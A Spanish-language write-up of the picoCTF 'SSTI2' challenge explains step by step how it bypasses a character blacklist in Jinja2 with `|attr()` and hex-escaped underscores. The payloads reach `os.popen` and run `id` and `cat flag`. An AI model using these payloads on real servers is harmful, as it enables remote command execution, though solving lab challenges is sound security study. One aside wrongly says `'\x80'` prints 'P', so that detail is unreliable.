I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

Hints:
- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?

## Solución
El entorno sigue siendo el mismo que en el reto [SSTI1](/picoCTF/Web/Examen/SSTI1.md), sin embargo, la seguridad se ha incrementado.

Este es el payload que funcionó con anterioridad:
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`

Sin embargo, ahora ya no se puede usar ni los puntos ni los guiones bajos, por lo que hay que obtener la bandera de otro modo.

En Python, se puede obtener el atributo de una clase usando la sintaxis `objeto|attr('atributo')`. Además, el motor de renderizado de la página es Jinja2, por lo cual, tiene objetos especiales, por ejemplo:
1. request
2. self
3. cycler
4. config

El objeto que importa es el de request, ya que contiene atributos importantes, entre ellos, uno llamado `application`, que contiene información de la aplicación ejecutandose. Siguiendo la sintaxis de obtener atributos, y el payload del reto anterior, el objetivo es llegar a los globals, que contiene una lista de modulos importados, donde se encuentra el módulo 'os' para ejecutar.

`{{ request|attr('application') ` es el payload inicial. Después de eso, se debería acceder a la variable globals, el cual, en Python se llama `__globals__`. Pero el servidor filtra los guiones bajos, entonces hay que tomar otra aproximación. Lo que se puede hacer en Python dentro de un string es usar el código ascii en formato hexadecimal, y así se pueden poner caracteres, por ejemplo:

`print('\x80')` imprimiría la letra 'P', por lo tanto, se puede usar  para agregar los guiones bajos sin escribir literalmente los guiones bajos. El siguiente  payoload sería este:

`{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f') }}`. Con esto, devuelve un diccionario. En Python, al usar `diccionario['clave']`, se invoca un método especial llamado `__getitem__`, y por lo tanto, se usará: `attr('\x5f\x5fgetitem\x5f\x5f')` para obtener la referencia de la función. Justo al lado, hay que agregar los paréntesis `('valor')` para invocarla. Sin embargo, aún no tenemos al alcance el módulo 'os'. Al parecer hay un módulo intermedio llamado `__builtins__`, el cual también es un diccionario. Por lo tanto, esta parte del payload quedaría así:

`attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')`

El diccionario 'builtins' si que contiene el módulo de os, pero dentro de un objeto llamado `__import__`, por lo tanto, esta parte quedaría de la siguiente manera:

`attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')`

Ahora si se tiene acceso al módulo os, y traduciendo la parte del payload del reto anterior: `os.popen('id').read()`, quedaría así:

`attr('popen')('id')|attr('read')()`

Al estar en el mismo entorno que el reto [SSTI1](/picoCTF/Web/Examen/SSTI1.md), se llegó a la conclusión que el comando que daba la bandera es `cat flag`, por lo tanto, el payload final para obtener la bandera sería este:

`{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}`

`picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}`